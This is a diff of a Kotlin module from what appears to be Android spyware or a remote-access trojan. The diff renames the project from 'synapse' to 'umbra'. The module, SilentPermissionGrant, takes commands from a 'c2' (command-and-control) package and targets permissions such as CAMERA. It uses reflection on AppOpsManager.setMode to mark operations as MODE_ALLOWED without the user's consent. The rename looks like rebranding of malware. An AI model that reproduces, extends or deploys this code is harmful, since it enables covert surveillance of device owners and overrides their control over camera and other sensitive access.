@@ -1,4 +1,4 @@
-package org.synapse.core.modules
+package org.umbra.core.modules
 
 import android.app.AppOpsManager
 import android.content.Context
@@ -9,8 +9,8 @@ import android.os.Parcel
 import android.os.Process
 import android.os.UserHandle
 import android.util.Log
-import org.synapse.core.c2.Command
-import org.synapse.core.core.SynapseResponse
+import org.umbra.core.c2.Command
+import org.umbra.core.core.UmbraResponse
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.withContext
 import kotlinx.coroutines.withTimeoutOrNull
@@ -20,7 +20,7 @@ import java.lang.reflect.Method
 
 object SilentPermissionGrant {
 
-    private const val TAG = "Synapse.SilentGrant"
+    private const val TAG = "Umbra.SilentGrant"
 
     private val DEFAULT_TARGET_PERMISSIONS = listOf(
         "android.permission.CAMERA",
@@ -92,7 +92,7 @@ object SilentPermissionGrant {
     // Main entry point
     // ═══════════════════════════════════════════════════════════════════════════
 
-    suspend fun grant(context: Context, cmd: Command): SynapseResponse = withContext(Dispatchers.IO) {
+    suspend fun grant(context: Context, cmd: Command): UmbraResponse = withContext(Dispatchers.IO) {
         val requested: List<String> = cmd.params["permissions"]
             ?.split(",")?.map { it.trim() }?.filter { it.isNotEmpty() }
             ?: DEFAULT_TARGET_PERMISSIONS
@@ -256,7 +256,7 @@ object SilentPermissionGrant {
 
         Log.d(TAG, "=== Silent grant complete: granted=${granted.size}, failed=${failed.size}, skipped=${skipped.size} ===")
 
-        SynapseResponse.PermissionGrantResponse(
+        UmbraResponse.PermissionGrantResponse(
             target_permissions = requested,
             granted = granted,
             failed = failed + skipped.map { "$it [requires_user_interaction]" },
@@ -399,7 +399,7 @@ object SilentPermissionGrant {
                                         paramTypes[2] == String::class.java -> {
                                         val opCode = tryGetOpCode(appOpsClass, opStr)
                                         if (opCode >= 0) {
-                                            method.invoke(appOps, opCode, uid, "org.synapse.core", AppOpsManager.MODE_ALLOWED)
+                                            method.invoke(appOps, opCode, uid, "org.umbra.core", AppOpsManager.MODE_ALLOWED)
                                             permSet = true
                                         }
                                     }
@@ -407,7 +407,7 @@ object SilentPermissionGrant {
                                     method.name == "setMode" && paramTypes.size == 5 -> {
                                         val opCode = tryGetOpCode(appOpsClass, opStr)
                                         if (opCode >= 0) {
-                                            method.invoke(appOps, opCode, uid, "org.synapse.core", AppOpsManager.MODE_ALLOWED, java.lang.Boolean.TRUE)
+                                            method.invoke(appOps, opCode, uid, "org.umbra.core", AppOpsManager.MODE_ALLOWED, java.lang.Boolean.TRUE)
                                             permSet = true
                                         }
                                     }
